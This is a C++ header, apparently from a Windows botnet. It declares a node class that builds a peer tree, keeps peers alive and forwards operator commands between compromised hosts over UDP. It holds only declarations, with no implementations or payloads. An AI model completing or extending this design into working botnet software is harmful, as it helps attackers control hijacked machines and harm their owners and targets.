#pragma once

#include "network.h"

#include <map>
#include <vector>
#include <stdio.h>
#include <winsock2.h>

#pragma pack(push, 1)
typedef struct
{
	adr host;
	short n_branches;
} tree_ext;

class BotnetNode;

typedef struct 
{
	adr src_addr;
	uint16_t original_id;
} command_fowarding;
#pragma pack(pop)

class BotnetNode
{
private:
	adr _adr;
	uint16_t _id;
	std::vector<BotnetNode*> _branches;
	std::map<uint16_t, command_fowarding> _nevigation_table;

	BotnetNode* findNode(
		const adr& addr,
		std::vector<adr>& hosts
	);

	BotnetNode* findPath(
		const adr& addr,
		std::vector<adr>& hosts,
		int* height
	);

public:

	BotnetNode();

	BotnetNode(
		uint32_t ip, 
		uint16_t port
	);

	struct sockaddr_in addPeer(
		struct botnet_pack* const pack,
		struct sockaddr_in private_addr,
		BOOL* const status
	);

	void handleSync(
		const u_char* pack,
		const struct sockaddr_in& peer_addr
	);

	void sendNetTree(
		const SOCKET& udp_sock,
		const struct sockaddr_in& peer_addr,
		std::vector<adr>& hosts,
		char* const buf
	);
	
	void keepAlive(
		const SOCKET& udp_sock
	);

	uint16_t fowardCommand(
		uint16_t command_id,
		const struct sockaddr_in& src_addr
	);

	struct sockaddr_in nextPathNode(
		const adr& dest_addr,
		const adr& private_addr,
		BOOL* b_status
	);

	adr retrieveCommand(
		struct botnet_pack* const command_res
	);
};